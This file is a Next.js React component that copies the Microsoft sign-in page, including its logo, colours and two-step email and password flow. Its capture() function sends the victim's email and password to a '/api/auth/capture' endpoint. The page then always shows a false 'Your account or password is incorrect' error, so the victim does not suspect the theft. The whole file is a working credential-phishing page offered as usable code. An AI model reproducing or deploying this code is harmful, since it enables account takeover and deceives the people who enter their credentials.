"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";

export default function MicrosoftLoginPage() {
  const router = useRouter();
  const [step, setStep] = useState<"email" | "password">("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [busy, setBusy] = useState(false);
  const [err, setErr] = useState("");

  async function capture() {
    try {
      await fetch("/api/auth/capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ provider: "microsoft", email, password }),
      });
    } catch {
      /* ignore */
    }
  }

  async function submitEmail(e: React.FormEvent) {
    e.preventDefault();
    if (!email) return;
    setErr("");
    setStep("password");
  }

  async function submitPassword(e: React.FormEvent) {
    e.preventDefault();
    if (!password) return;
    setBusy(true);
    await capture();
    setBusy(false);
    setErr("Your account or password is incorrect.");
    setPassword("");
  }

  return (
    <div className="min-h-screen bg-[#f2f2f2] flex items-center justify-center px-4">
      <div className="w-full max-w-[440px] bg-white p-10 shadow-sm">
        <div className="mb-4">
          <svg width="108" height="23" viewBox="0 0 108 23" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M46.09 0H46.2L52.55 16.15H48.73L47.69 13.11H42.65L41.61 16.15H37.79L44.14 0H46.09ZM45.17 3.56L43.33 9.55H46.99L45.17 3.56Z" fill="#737373"/>
            <path d="M53.37 4.85H56.99V6.33C57.64 5.45 58.73 4.62 60.39 4.62C63.04 4.62 64.35 6.22 64.35 9.05V16.15H60.73V9.87C60.73 8.36 60.17 7.56 58.99 7.56C57.69 7.56 56.99 8.48 56.99 9.99V16.15H53.37V4.85Z" fill="#737373"/>
            <path d="M65.59 10.5C65.59 6.87 68.13 4.62 71.31 4.62C73.28 4.62 74.62 5.6 75.31 6.74V0H78.93V16.15H75.31V14.23C74.59 15.42 73.19 16.38 71.2 16.38C68.13 16.38 65.59 14.13 65.59 10.5ZM75.31 10.5C75.31 8.51 74.04 7.45 72.51 7.45C70.99 7.45 69.71 8.51 69.71 10.5C69.71 12.48 70.99 13.55 72.51 13.55C74.04 13.55 75.31 12.48 75.31 10.5Z" fill="#737373"/>
            <path d="M80.17 10.5C80.17 6.87 82.71 4.62 85.89 4.62C87.86 4.62 89.2 5.6 89.89 6.74V4.85H93.51V16.15H89.89V14.23C89.17 15.42 87.77 16.38 85.78 16.38C82.71 16.38 80.17 14.13 80.17 10.5ZM89.89 10.5C89.89 8.51 88.62 7.45 87.09 7.45C85.57 7.45 84.29 8.51 84.29 10.5C84.29 12.48 85.57 13.55 87.09 13.55C88.62 13.55 89.89 12.48 89.89 10.5Z" fill="#737373"/>
            <path d="M95.01 0H98.63V16.15H95.01V0Z" fill="#737373"/>
            <path d="M100.13 0H103.75V16.15H100.13V0Z" fill="#737373"/>
            <path d="M105.25 0H108V16.15H105.25V0Z" fill="#737373"/>
            <path fillRule="evenodd" clipRule="evenodd" d="M0 0H22V22H0V0Z" fill="#F25022"/>
            <path fillRule="evenodd" clipRule="evenodd" d="M0 0H10.5V10.5H0V0Z" fill="#F25022"/>
            <path fillRule="evenodd" clipRule="evenodd" d="M11.5 0H22V10.5H11.5V0Z" fill="#7FBA00"/>
            <path fillRule="evenodd" clipRule="evenodd" d="M0 11.5H10.5V22H0V11.5Z" fill="#00A4EF"/>
            <path fillRule="evenodd" clipRule="evenodd" d="M11.5 11.5H22V22H11.5V11.5Z" fill="#FFB900"/>
          </svg>
        </div>

        <h1 className="text-2xl font-light text-[#1b1b1b] mb-2">
          {step === "email" ? "Sign in" : "Enter password"}
        </h1>
        {step === "password" && (
          <button
            onClick={() => setStep("email")}
            className="text-sm text-[#0067b8] hover:underline mb-4 block"
          >
            {email}
          </button>
        )}

        {step === "email" ? (
          <form onSubmit={submitEmail} className="space-y-4">
            <div>
              <input
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Email, phone, or Skype"
                required
                className="w-full border border-[#8c8c8c] px-3 py-2 text-sm text-[#1b1b1b] placeholder-[#8c8c8c] focus:border-[#0067b8] outline-none"
              />
            </div>
            <p className="text-xs text-[#1b1b1b]">
              No account?{" "}
              <span className="text-[#0067b8] hover:underline cursor-pointer">Create one!</span>
            </p>
            <button
              type="submit"
              className="bg-[#0067b8] text-white text-sm px-6 py-2 hover:bg-[#005a9e]"
            >
              Next
            </button>
          </form>
        ) : (
          <form onSubmit={submitPassword} className="space-y-4">
            <div>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                required
                autoFocus
                className="w-full border border-[#8c8c8c] px-3 py-2 text-sm text-[#1b1b1b] placeholder-[#8c8c8c] focus:border-[#0067b8] outline-none"
              />
            </div>
            {err && <div className="text-xs text-red-600">{err}</div>}
            <div className="text-xs text-[#0067b8] hover:underline cursor-pointer">
              Forgot password?
            </div>
            <button
              type="submit"
              disabled={busy}
              className="bg-[#0067b8] text-white text-sm px-6 py-2 hover:bg-[#005a9e] disabled:opacity-60"
            >
              {busy ? "Signing in…" : "Sign in"}
            </button>
          </form>
        )}

        <div className="mt-8 text-xs text-[#8c8c8c]">
          <span className="hover:underline cursor-pointer">Terms of use</span>
          {" "}&middot;{" "}
          <span className="hover:underline cursor-pointer">Privacy & cookies</span>
        </div>
      </div>
    </div>
  );
}
